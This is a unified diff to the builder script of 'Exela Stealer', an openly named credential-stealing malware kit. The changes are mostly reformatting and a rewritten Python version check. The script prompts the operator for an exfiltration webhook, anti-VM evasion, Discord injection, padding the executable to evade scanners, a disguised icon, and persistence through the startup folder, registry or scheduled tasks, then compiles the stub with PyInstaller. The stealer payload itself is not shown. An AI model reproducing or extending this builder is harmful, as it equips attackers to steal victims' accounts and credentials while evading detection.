@@ -1,17 +1,9 @@
-import os, ctypes, shutil, sys, time
-from pkg_resources import parse_version
+import os, ctypes, shutil, sys
 
 try:
-    ctypes.windll.kernel32.SetConsoleTitleW(
-        f"Exela Stealer | Builder | {os.getenv('computername')}"
-    )
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Exela Stealer | Builder | {os.getenv('computername')}")
 except:
     pass
-try:
-    os.system("color d & cls")
-except:
-    pass
-
 
 class Build:
     def __init__(self) -> None:
@@ -29,8 +21,6 @@ class Build:
 
     def CallFuncions(self) -> None:
         try:
-            self.InstallModules()
-            os.system("cls")
             self.GetWebhook()
             self.GetAntiVm()
             self.GetDiscordInjection()
@@ -58,26 +48,15 @@ class Build:
                 os.rename("stub.exe", "Exela.exe")
             print("\nfile compiled, close the window")
         except Exception as e:
-            ctypes.windll.user32.MessageBoxW(
-                0,
-                f"An error occurred while building your file. error code\n\n{str(e)}",
-                "Error",
-                0x10,
-            )
+            ctypes.windll.user32.MessageBoxW(0,f"An error occurred while building your file. error code\n\n{str(e)}","Error",0x10,)
         else:
-            ctypes.windll.user32.MessageBoxW(
-                0,
-                "Your file compiled succesfully, now u can close the window.",
-                "Information",
-                0x40,
-            )
+            os.system("start .")
+            ctypes.windll.user32.MessageBoxW(0,"Your file compiled succesfully, now u can close the window.","Information",0x40,)
             while True:
                 continue
 
     def PumpFile(self) -> None:
-        pump_q = str(
-            input("Yes/No (Default size 10 or 11 mb)\nDo u want to pump the file : ")
-        )
+        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo u want to pump the file : "))
         if pump_q.lower() == "y" or pump_q.lower() == "yes":
             pump_size = int(input("how much mb size u want to pumps : "))
             self.pump = True
@@ -90,23 +69,13 @@ class Build:
             additional_size_bytes = additional_size_mb * 1024 * 1024
 
             with open(file_name, "ab") as file:
-                current_size = file.tell()
-                target_size = current_size + additional_size_bytes
-
                 empty_bytes = bytearray([0x00] * additional_size_bytes)
                 file.write(empty_bytes)
 
-                print(
-                    f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"'
-                )
+                print(f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"')
 
     def build_file(self) -> None:
         os.system(self.PyInstallerCommand)
-
-    def InstallModules(self) -> None:
-        os.system("pip install cryptography")
-        os.system("pip install aiohttp")
-        os.system("pip install pyinstaller")
 
     def WriteSettings(self) -> None:
         with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
@@ -129,11 +98,7 @@ class Build:
     def GetIcon(self) -> None:
         get_icon = str(input("Yes/No\nDo u want to change the icon of the file : "))
         if get_icon.lower() == "yes" or get_icon.lower() == "y":
-            get_icon_path = str(
-                input(
-                    "icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "
-                )
-            )
+            get_icon_path = str(input("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
             if not get_icon_path.endswith(".ico"):
                 print("pls use .ico file, now icon change has been disabled")
                 self.PyInstallerCommand += " --icon=NONE stub.py"
@@ -145,9 +110,7 @@ class Build:
                     if self.CheckIcoFile(get_icon_path):
                         self.PyInstallerCommand += f" --icon={get_icon_path} stub.py"
                     else:
-                        print(
-                            "Your file doesnt current a ico file, icon change has been disabled"
-                        )
+                        print("Your file doesnt current a ico file, icon change has been disabled")
                         self.PyInstallerCommand += " --icon=NONE stub.py"
         else:
             self.PyInstallerCommand += " --icon=NONE stub.py"
@@ -204,9 +167,7 @@ class Build:
         getStartupReq = str(input("Yes/no\nDo you want to use Startup : "))
         if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
             self.startup = True
-            print(
-                "--------------------------------------------\n1-)Folder Startup (This method use windows startup folder's for startup) \n2-)HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n3-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-)Disable Startup\n--------------------------------------------\n\n"
-            )
+            print("--------------------------------------------\n1-)Folder Startup (This method use windows startup folder's for startup) \n2-)HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n3-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-)Disable Startup\n--------------------------------------------\n\n")
             getStartupMethod = input("1/2/3/4\nEnter your selection: ")
             if getStartupMethod == "1":
                 self.StartupMethod = "folder"
@@ -234,42 +195,10 @@ class Build:
 
 if __name__ == "__main__":
     if os.name == "nt":
-        version = ".".join(
-            [
-                str(x)
-                for x in (
-                    sys.version_info.major,
-                    sys.version_info.minor,
-                    sys.version_info.micro,
-                )
-            ]
-        )
-        if parse_version(version) < parse_version("3.9"):
-            ctypes.windll.user32.MessageBoxW(
-                0,
-                f"{str(version)} un supported by Exela, pls upgrade 3.9 or 3.11",
-                "Error",
-                0x10,
-            )
-        elif parse_version(version) > parse_version("3.11"):
-            ctypes.windll.user32.MessageBoxW(
-                0,
-                f"{str(version)} un supported by Exela, pls downgrade 3.11 or 3.10 or 3.9",
-                "Error",
-                0x10,
-            )
-        elif (
-            parse_version(version) == parse_version("3.11")
-            or parse_version(version) == parse_version("3.10")
-            or parse_version(version) == parse_version("3.9")
-        ):
+        if (sys.version_info.major == 3 and sys.version_info.minor >= 10 and sys.version_info.minor < 12):
             Build().CallFuncions()
         else:
-            ctypes.windll.user32.MessageBoxW(
-                0,
-                f"{str(version)} un supported by Exela, pls use 3.11.0",
-                "Error",
-                0x10,
-            )
+            message = "Your Python version is unsupported by Exela. Please use Python 3.10.0 or 3.11.0"
+            ctypes.windll.user32.MessageBoxW(None, ctypes.c_wchar_p(message), "Error", 0x10)
     else:
         print("just windows operating systems supported!")
